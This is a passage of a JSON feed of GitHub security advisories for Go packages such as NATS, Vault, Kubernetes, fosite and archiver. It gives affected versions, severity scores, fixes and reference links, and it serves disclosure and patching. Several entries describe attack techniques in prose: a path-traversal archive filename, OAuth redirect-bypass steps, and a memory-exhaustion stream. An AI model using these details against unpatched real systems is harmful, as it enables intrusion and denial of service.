Server\n\n * Version 2 prior to 2.2.0\n   + 2.0.0 through and including 2.1.9 are vulnerable.\n * fixed with nats-io/nats-server PR 1731, commit 2e3c226729\n\n\n## Impact\n\nThe nats-server could be killed, after consuming resources.\n\n\n## Workaround\n\nThe import cycle requires at least two accounts to work; if you have open account sign-up, then restricting new account sign-up might hinder an attacker.\n\n\n## Solution\n\nUpgrade the nats-server.\n\n\n## Caveat on NATS with untrusted users\n\nRunning a NATS service which is exposed to untrusted users presents a heightened risk.\n\nAny remote execution flaw or equivalent seriousness, or denial-of-service by unauthenticated users, will lead to prompt releases by the NATS maintainers.\n\nFixes for denial of service issues with no threat of remote execution, when limited to account holders, are likely to just be committed to the main development branch with no special attention.\n\nThose who are running such services are encouraged to build regularly from git.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-gwj5-3vfq-q992"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:07:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rrfw-hg9m-j47h", "modified": "2021-10-08T21:25:26Z", "published": "2021-05-24T16:59:42Z", "aliases": [], "summary": "Signature Validation Bypass", "details": "### Impact\n\nAn authentication bypass exists in the [goxmldsig](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7) this library uses to determine if SAML assertions are genuine. An attacker could craft a SAML response that would appear to be valid but would not have been genuinely issued by the IDP.\n\n### Patches\n\nVersion 0.4.2 bumps the dependency which should fix the issue.\n\n### For more information\n\nPlease see [the advisory in goxmldsig](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7)\n\n## Credits\n\nThe original vulnerability was discovered by @jupenur. Thanks to @russellhaering for the heads up.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.1"}}], "references": [{"type": "WEB", "url": "https://github.com/crewjam/saml/security/advisories/GHSA-rrfw-hg9m-j47h"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/goxmldsig"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:23:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4gh8-x3vv-phhg", "modified": "2023-01-10T16:09:36Z", "published": "2021-05-18T18:30:38Z", "aliases": ["CVE-2021-29499"], "summary": "Predictable SIF UUID Identifiers in github.com/sylabs/sif", "details": "### Impact\n\nThe `siftool new` command and [func siftool.New()](https://pkg.go.dev/github.com/sylabs/sif/pkg/siftool#New) produce predictable UUID identifiers due to insecure randomness in the version of the `github.com/satori/go.uuid` module used as a dependency.\n\n### Patches\n\nA patch is available in version >= v1.2.3 of the module. Users are encouraged to upgrade.\n\nThe patch is commit https://github.com/sylabs/sif/commit/193962882122abf85ff5f5bcc86404933e71c07d\n\n### Workarounds\nUsers passing [CreateInfo struct](https://pkg.go.dev/github.com/sylabs/sif/pkg/sif#CreateInfo) should ensure the `ID` field is generated using a version of `github.com/satori/go.uuid` that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:\n\n```\ngo get github.com/satori/go.uuid@75cca531ea763666bc46e531da3b4c3b95f64557\n```\n\n### References\n* https://github.com/satori/go.uuid/issues/73\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/sylabs/sif](https://github.com/sylabs/sif/issues/new)\n* Email us at [security@sylabs.io](mailto:security@sylabs.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/sif"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sylabs/sif/security/advisories/GHSA-4gh8-x3vv-phhg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29499"}, {"type": "WEB", "url": "https://github.com/satori/go.uuid/issues/73"}, {"type": "WEB", "url": "https://github.com/sylabs/sif/commit/193962882122abf85ff5f5bcc86404933e71c07d"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/sif"}], "database_specific": {"cwe_ids": ["CWE-330", "CWE-340"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-07T17:01:30Z", "nvd_published_at": "2021-05-07T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-25xj-89g5-fm6h", "modified": "2023-10-02T15:05:17Z", "published": "2021-05-18T18:21:09Z", "aliases": ["CVE-2020-13223"], "summary": "Information Disclosure in HashiCorp Vault", "details": "HashiCorp Vault and Vault Enterprise before 1.3.6, and 1.4.2 before 1.4.2, insert Sensitive Information into a Log File. The vulnerability is affecting `github.com/hashicorp/vault/command` Go package.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13223"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/commit/87f47c216cf1a28f4054b80cff40de8c9e00e36c"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/commit/e52f34772affb69f3239b2cdf6523cb7cfd67a92"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#142-may-21st-2020"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/vault/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T14:30:01Z", "nvd_published_at": "2020-06-10T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-58v3-j75h-xr49", "modified": "2021-05-17T15:26:35Z", "published": "2021-05-18T15:44:30Z", "aliases": ["CVE-2017-18367"], "summary": "Improper Input Validation in libseccomp-golang", "details": "libseccomp-golang 0.9.0 and earlier incorrectly generates BPFs that OR multiple arguments rather than ANDing them. A process running under a restrictive seccomp filter that specified multiple syscall arguments could bypass intended access restrictions by specifying a single matching argument.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/seccomp/libseccomp-golang"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-18367"}, {"type": "WEB", "url": "https://github.com/seccomp/libseccomp-golang/issues/22"}, {"type": "WEB", "url": "https://github.com/seccomp/libseccomp-golang/commit/06e7a29f36a34b8cf419aeb87b979ee508e58f9e"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4087"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4090"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/08/msg00016.html"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4574-1/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/04/25/6"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T15:26:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5796-p3m6-9qj4", "modified": "2023-02-07T18:23:16Z", "published": "2021-05-18T15:31:39Z", "aliases": ["CVE-2019-11289"], "summary": "Cloud Foundry Routing Improper Input Validation vulnerability", "details": "Cloud Foundry Routing, all versions before 0.0.0-20191101214924-b1b5c44e050f, does not properly validate nonce input. A remote unauthorized malicious user could forge a route service request using an invalid nonce that will cause the Gorouter to crash.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.cloudfoundry.org/gorouter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20191101214924-b1b5c44e050f"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cloudfoundry/gorouter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20191101214924-b1b5c44e050f"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11289"}, {"type": "WEB", "url": "https://github.com/cloudfoundry/gorouter/commit/b1b5c44e050f73b399b379ca63a42a2c5780a83f"}, {"type": "PACKAGE", "url": "https://github.com/cloudfoundry/gorouter"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0102"}, {"type": "WEB", "url": "https://www.cloudfoundry.org/blog/cve-2019-11289"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:24:54Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w4x5-jqq4-qc8x", "modified": "2021-05-04T22:00:55Z", "published": "2021-05-18T18:27:43Z", "aliases": ["CVE-2019-19026"], "summary": "SQL Injection in Cloud Native Computing Foundation Harbor", "details": "Cloud Native Computing Foundation Harbor prior to 1.8.6 and 1.9.3 allows SQL Injection via project quotas in the VMware Harbor Container Registry for the Pivotal Platform.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.8.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-rh89-vvrg-fg64"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19026"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories"}, {"type": "WEB", "url": "https://tanzu.vmware.com/security/cve-2019-19026"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-04T22:00:55Z", "nvd_published_at": "2020-03-20T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jv9c-w74q-6762", "modified": "2021-05-24T16:53:16Z", "published": "2021-05-24T16:56:23Z", "aliases": ["CVE-2020-25040"], "summary": "Insecure permissions on build temporary rootfs in Singularity", "details": "### Impact\n\nInsecure permissions on temporary directories used in explicit and implicit container build operations.\n\nWhen a Singularity command that results in a container build operation is executed, it is possible for a user with access to the system to read the contents of the image during the build. Additionally, if the image contains a world-writable file or directory, it is possible for a user to inject arbitrary content into the running build, which in certain circumstances may enable arbitrary code execution during the build and/or when the built container is run.\n\n### Patches\n\nThis issue is addressed in Singularity 3.6.3.\n\nAll users are advised to upgrade to 3.6.3.\n\n### Workarounds\n\nThe issue is mitigated if `TMPDIR` is set to a location that is only accessible to the user, as any subdirectories directly under `TMPDIR` cannot then be accessed by others. However, this is difficult to enforce so it is not recommended to rely on this as a mitigation.\n\n### For more information\n\nGeneral questions about the impact of the advisory / changes made in the 3.6.0 release can be asked in the:\n\n* [Singularity Slack Channel](https://bit.ly/2m0g3lX)\n* [Singularity Mailing List](https://groups.google.com/a/lbl.gov/forum/??sdf%7Csort:date#!forum/singularity)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.6.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-jv9c-w74q-6762"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-25040"}, {"type": "WEB", "url": "https://medium.com/sylabs"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00070.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00088.html"}], "database_specific": {"cwe_ids": ["CWE-668", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T16:53:16Z", "nvd_published_at": "2020-09-16T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h74j-692g-48mq", "modified": "2023-09-29T17:04:48Z", "published": "2021-05-18T15:31:53Z", "aliases": ["CVE-2019-10743"], "summary": "Path Traversal in MHolt Archiver", "details": "All versions of archiver allow attacker to perform a Zip Slip attack via the \"unarchive\" functions. It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\n### Specific Go Packages Affected\ngithub.com/mholt/archiver/cmd/arc", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mholt/archiver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10743"}, {"type": "WEB", "url": "https://github.com/mholt/archiver/pull/169"}, {"type": "WEB", "url": "https://github.com/mholt/archiver/pull/203"}, {"type": "WEB", "url": "https://github.com/mholt/archiver/commit/8217ed3a206c0473b4ec1aff51375b398838073a"}, {"type": "WEB", "url": "https://github.com/snyk/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERCMDARC-174728,"}], "database_specific": {"cwe_ids": ["CWE-29"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:21:43Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pmqp-h87c-mr78", "modified": "2023-09-29T15:22:47Z", "published": "2021-05-18T15:38:48Z", "aliases": ["CVE-2019-11253"], "summary": "XML Entity Expansion and Improper Input Validation in Kubernetes API server", "details": "Improper input validation in the Kubernetes API server in versions v1.0-1.12 and versions prior to v1.13.12, v1.14.8, v1.15.5, and v1.16.2 allows authorized users to send malicious YAML or JSON payloads, causing the API server to consume excessive CPU or memory, potentially crashing and becoming unavailable. Prior to v1.14.0, default RBAC policy authorized anonymous users to submit requests that could trigger this vulnerability. Clusters upgraded from a version prior to v1.14.0 keep the more permissive policy by default for backwards compatibility.\n\n### Specific Go Packages Affected\nk8s.io/kubernetes/pkg/apiserver", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.13.12"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.8"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.16.0"}, {"fixed": "1.16.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11253"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/83253"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/83261"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3239"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3811"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3905"}, {"type": "WEB", "url": "https://gist.github.com/bgeesaman/0e0349e94cd22c48bf14d8a9b7d6b8f2"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/jk8polzSUxs"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20191031-0006/"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-776"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:06:33Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rfq3-w54c-f9q5", "modified": "2021-11-19T14:42:56Z", "published": "2021-05-24T17:00:12Z", "aliases": ["CVE-2020-15233"], "summary": "OAuth2 Redirect URL validity does not respect query parameters and character casing for loopback addresses", "details": "### Impact\n\n[fosite#400](https://github.com/ory/fosite/pull/400) (released as v0.30.2) introduced a new feature for handling redirect URLs pointing to loopback interfaces ([rfc8252#section-7.3](https://tools.ietf.org/html/rfc8252#section-7.3)). As part of that change new behavior was introduced which failed to respect the redirect URL's (only for loopback interfaces!) query parameters\n\n1. Registering a client with allowed redirect URL `http://127.0.0.1/callback`\n2. Performing OAuth2 flow and requesting redirect URL `http://127.0.0.1/callback?bar=foo`\n3. Instead of an error, the browser is redirected to `http://127.0.0.1/callback?bar=foo` with a potentially successful OAuth2 response.\n\nas well as the host parameter (as long as the host is a loopback interface):\n\n1. Registering a client with allowed redirect URL `https://example.com/callback`\n2. Performing OAuth2 flow and requesting redirect URL `http://127.0.0.1/callback`\n3. Instead of an error, the browser is redirected to `http://127.0.0.1/callback` with a potentially successful OAuth2 response.\n\nThese bugs are only applicable in scenarios where the attacker has control over the loopback interface (`localhost`, `127.0.0.1`, `[::1]`) where the browser performing the OAuth2 flow is running.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/fosite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.30.3"}, {"fixed": "0.34.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/fosite/security/advisories/GHSA-rfq3-w54c-f9q5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15233"}, {"type": "WEB", "url": "https://github.com/ory/fosite/pull/400"}, {"type": "WEB", "url": "https://github.com/ory/fosite/commit/cdee51ebe721bfc8acca0fd0b86b030ca70867bf"}, {"type": "PACKAGE", "url": "https://github.com/ory/fosite"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:14:38Z", "nvd_published_at": "2020-10-02T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fqh4-rh59-xhvf", "modified": "2023-09-14T19:22:34Z", "published": "2021-05-18T21:07:43Z", "aliases": ["CVE-2021-23351"], "summary": "github.com/pires/go-proxyproto denial of service vulnerability", "details": "The package `github.com/pires/go-proxyproto` before 0.5.0 are vulnerable to Denial of Service (DoS) via the `parseVersion1()` function. The reader in this package is a default `bufio.Reader` wrapping a `net.Conn`. It will read from the connection until it finds a newline. Since no limits are implemented in the code, a deliberately malformed V1 header could be used to exhaust memory in a server process using this code - and create a DoS. This can be exploited by sending a stream starting with PROXY and continuing to send data (which does not contain a newline) until the target stops acknowledging. The risk here is small, because only trusted sources should be allowed to send proxy protocol headers.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pires/go-proxyproto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23351"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/issues/69"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/pull/71"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/commit/7f48261db810703d173f27f3309a808cc2b49b8b"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BNVGJMVI3ZTZ675EFPUHPGXCKCGSX46/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/C36IBVOZXRTWM7MGTRUTOM56P5RR74VU/"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPIRESGOPROXYPROTO-1081577"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:03:39Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-ffhg-7mh4-33c4", "modified": "2023-02-16T00:14:18Z", "published": "2021-05-18T15:29:31Z", "aliases": ["CVE-2020-9283"], "summary": "Improper Verification of Cryptographic Signature in golang.org/x/crypto", "details": "golang.org/x/crypto before v0.0.0-20200220183623-bac4c82f6975 for Go allows a panic during signature verification in the golang.org/x/crypto/ssh package. A client can attack an SSH server that accepts public keys. Also, a server can attack any SSH client.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20200220183623-bac4c82f6975"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9283"}, {"type": "WEB", "url": "https://github.com/golang/crypto/commit/bac4c82f69751a6dd76e702d54b3ceb88adab236"}, {"type": "PACKAGE", "url": "https://github.com/golang/crypto"}, {"type": "WEB", "url": "https://go.dev/cl/220357"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/bac4c82f69751a6dd76e702d54b3ceb88adab236"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/3L45YRc91SY"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/3L45YRc91SY"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/10/msg00014.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00027.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00031.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0012"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/48121"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/156480/Go-SSH-0.0.2-Denial-Of-Service.html"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T22:02:30Z", "nvd_published_at": "2020-02-20T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-74xm-qj29-cq8p", "modified": "2023-08-29T23:21:14Z", "published": "2021-05-25T18:42:42Z", "aliases": ["CVE-2021-28681"], "summary": "In github.com/pion/webrtc, failed DTLS certificate verification doesn't stop data channel communication", "details": "### Impact\nData channel communication was incorrectly allowed with users who have failed DTLS certificate verification.\n\nThis attack requires \n* Attacker knows the ICE password. \n* Only take place during PeerConnection handshake.\n\nThis attack can be detected by monitoring `PeerConnectionState` in all versions of Pion WebRTC.\n\n### Patches\nUsers should upgrade to v3.0.15. \n\nThe exact patch is https://github.com/pion/webrtc/commit/545613dcdeb5dedb01cce94175f40bcbe045df2e\n\n### Workarounds\nUsers should listen for when `PeerConnectionState` changes to `PeerConnectionStateFailed`. When it enters this state users should not continue using the PeerConnection.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/pion/webrtc\n* Email us at [team@pion.ly](mailto:team@pion.ly)\n\nThank you to https://github.com/Gaukas for discovering this.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/webrtc/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.15"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/webrtc/security/advisories/GHSA-74xm-qj29-cq8p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28681"}, {"type": "WEB", "url": "https://github.com/pion/webrtc/issues/1708"}, {"type": "WEB", "url": "https://github.com/pion/webrtc/pull/1709"}, {"type": "WEB", "url": "https://github.com/pion/webrtc/commit/545613dcdeb5dedb01cce94175f40bcbe045df2e"}, {"type": "PACKAGE", "url": "https://github.com/pion/webrtc"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0104"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:29:41Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-733f-44f3-3frw", "modified": "2023-08-30T11:07:54Z", "published": "2021-05-18T21:08:35Z", "aliases": ["CVE-2020-12666"], "summary": "gopkg.in/macaron.v1 Open redirect vulnerability", "details": "macaron before 1.3.7 has an open redirect in the static handler. Due to improper request santization, a specifically crafted URL can cause the static file handler to redirect to an attacker chosen URL, allowing for open redirect attacks.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/macaron.v1"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12666"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/issues/198"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/issues/198#issuecomment-622885959"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/pull/199"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/pull/199/commits/6bd9385542f7133467ab7d09a5f28f7d5dc52af7"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/commit/addc7461c3a90a040e79aa75bfd245107a210245"}, {"type": "PACKAGE", "url": "https://github.com/go-macaron/macaron"}, {"type": "WEB", "url": "https://github.com/go-macaron/macaron/releases/tag/v1.3.7"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3QEUOHRC4EN4WZ66EVFML2UCV7ZQ63XZ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0039"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:50:16Z", "nvd_published_at": "2020-05-05T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rmh2-65xw-9m6q", "modified": "2023-02-07T20:02:24Z", "published": "2021-05-18T18:26:25Z", "aliases": ["CVE-2020-10675"], "summary": "Infinite Loop in jsonparser", "details": "The Library API in buger jsonparser through 2019-12-04 allows attackers to cause a denial of service (infinite loop) via a Delete call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/buger/jsonparser"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10675"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/issues/188"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/pull/192"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/commit/91ac96899e492584984ded0c8f9a08f10b473717"}, {"type": 